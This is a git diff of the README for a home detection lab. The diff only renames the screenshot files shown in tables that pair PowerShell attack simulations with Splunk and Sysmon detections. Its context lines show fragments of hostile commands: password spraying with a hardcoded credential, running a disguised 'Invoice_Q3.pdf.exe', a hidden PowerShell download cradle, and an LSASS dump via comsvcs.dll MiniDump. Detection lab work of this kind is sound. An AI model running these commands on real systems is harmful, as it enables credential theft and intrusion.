@@ -86,7 +86,7 @@ net use \\127.0.0.1\IPC$ /user:CORP\finance_svc "Finance2026!!"
 
 | Attack Simulation (PowerShell) | Splunk Detection (Search & Reporting) |
 | :---: | :---: |
-| ![PowerShell Password Spray](assets/screenshots/02_brute_force/01_ps_brute_force.png) | ![Splunk Failed Logins](assets/screenshots/02_brute_force/1.png) |
+| ![PowerShell Password Spray](assets/screenshots/02_brute_force/brute_powershell.png) | ![Splunk Failed Logins](assets/screenshots/02_brute_force/1.png) |
 
 **Detection SPL:**
 ```spl
@@ -111,7 +111,7 @@ Start-Process -FilePath "C:\Users\Public\Downloads\Invoice_Q3.pdf.exe" -Argument
 
 | Attack Simulation (PowerShell) | Splunk Sysmon Detection (Search & Reporting) |
 | :---: | :---: |
-| ![Phishing Drop & Exec](assets/screenshots/03_phishing/01_ps_phishing_exec.png) | ![Sysmon Event 1 Detection](assets/screenshots/03_phishing/1.png) |
+| ![Phishing Drop & Exec](assets/screenshots/03_phishing/phising_powershell.png) | ![Sysmon Event 1 Detection](assets/screenshots/03_phishing/1.png) |
 
 **Detection SPL:**
 ```spl
@@ -134,7 +134,7 @@ powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Ur
 
 | Attack Simulation (PowerShell) | Splunk Sysmon Detection (Search & Reporting) |
 | :---: | :---: |
-| ![PowerShell Cradle](assets/screenshots/04_powershell_cradle/01_ps_cradle.png) | ![Splunk PowerShell Detection](assets/screenshots/04_powershell_cradle/1.png) |
+| ![PowerShell Cradle](assets/screenshots/04_powershell_cradle/cradle_powershell.png) | ![Splunk PowerShell Detection](assets/screenshots/04_powershell_cradle/1.png) |
 
 **Detection SPL:**
 ```spl
@@ -163,7 +163,7 @@ rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid C:\Users\Public
 
 | Attack Simulation (PowerShell) | Splunk Detection (Search & Reporting) |
 | :---: | :---: |
-| ![LSASS Attack Script](assets/screenshots/05_lsass_dump-and-suricata_ids/01_ps_lsass_dump.png) | ![Sysmon Event 10 LSASS Access](assets/screenshots/05_lsass_dump-and-suricata_ids/4.png) |
+| ![LSASS Attack Script](assets/screenshots/05_lsass_dump-and-suricata_ids/isass_dump_powershell.png) | ![Sysmon Event 10 LSASS Access](assets/screenshots/05_lsass_dump-and-suricata_ids/4.png) |
 
 | Suricata C2 Trigger | Suricata NIDS Alert in Splunk (`eve.json`) |
 | :---: | :---: |
